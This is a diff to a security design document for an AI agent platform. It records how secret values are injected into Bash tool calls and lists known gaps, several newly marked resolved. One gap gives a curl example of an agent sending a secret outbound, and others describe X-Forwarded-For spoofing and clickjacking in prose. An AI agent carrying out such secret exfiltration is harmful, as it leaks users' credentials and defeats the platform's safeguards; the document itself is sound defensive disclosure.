@@ -107,7 +107,7 @@ Secrets are stored in `config.yaml` (root-only, `0600`) and managed via the `/se
 
 1. Secret *names* are listed in the agent's system prompt so the LLM knows what's available.
 2. Secret *values* are injected as environment variables into bash commands at execution time.
-3. The control plane sends secret values with each `ExecuteTool` RPC via the `secret_env` proto field, so changes take effect immediately.
+3. The control plane sends secret values only with `Bash` tool calls via the `secret_env` proto field. Other tools receive no secrets.
 
 This design ensures secret values never appear in conversation history, system prompts, or LLM context — only in the ephemeral environment of shell commands.
 
@@ -183,11 +183,11 @@ gRPC uses `insecure.NewCredentials()` for transport — this is safe because Uni
 The following are known security gaps identified during audit, tracked for future resolution:
 
 - **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Network isolation (`network.egress`) is the primary mitigation — agents that handle sensitive secrets should have restricted egress.
-- **Secrets sent for all tool calls.** Secret env vars are currently included in every `ExecuteTool` gRPC message, not just Bash calls. This widens the in-process exposure window. A future improvement should gate injection to Bash-only calls.
+- **~~Secrets sent for all tool calls.~~** Resolved. Secret env vars are now only included in `ExecuteTool` requests for the `Bash` tool. Other tools receive no secrets.
 - **Short secret redaction floor.** The output redactor only scrubs secrets with values of 8+ characters (`minSecretLen`). Shorter secrets (PINs, short tokens) may appear unredacted in tool output and conversation history.
 - **~~Session cookie lacks `Secure` flag.~~** Resolved. The `hiro_session` cookie now dynamically sets the `Secure` flag when the request arrives over TLS (direct or via trusted proxy with `X-Forwarded-Proto: https`).
 - **Incomplete security response headers.** `Content-Security-Policy` and `X-Content-Type-Options` are set on share and log endpoints, but not globally. `X-Frame-Options` is not set on any endpoint. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
 - **Share tokens do not expire.** File share tokens are valid for the lifetime of the session secret (rotated on password change). There is no per-token TTL.
-- **Share token key reuse.** The share token AES-GCM encryption key is the same as the session HMAC signing key. A future improvement should use HKDF derivation for a separate key.
+- **~~Share token key reuse.~~** Resolved. The share token AES-GCM key is now derived from the session signing secret via HKDF with a dedicated info string (`hiro-share-token-v1`).
 - **Rate limiter trusts `X-Forwarded-For` from private peers.** When behind a proxy that doesn't sanitize `X-Forwarded-For`, an attacker can inject arbitrary IPs to bypass the login rate limiter.
-- **Swarm code entropy.** The 8-character swarm code has ~40 bits of entropy. A determined attacker with relay access could brute-force it in ~12 days. Longer codes (12+ chars) would improve this.
+- **~~Swarm code entropy.~~** Resolved. Swarm codes are now 12 characters (~60 bits of entropy), making brute-force infeasible.
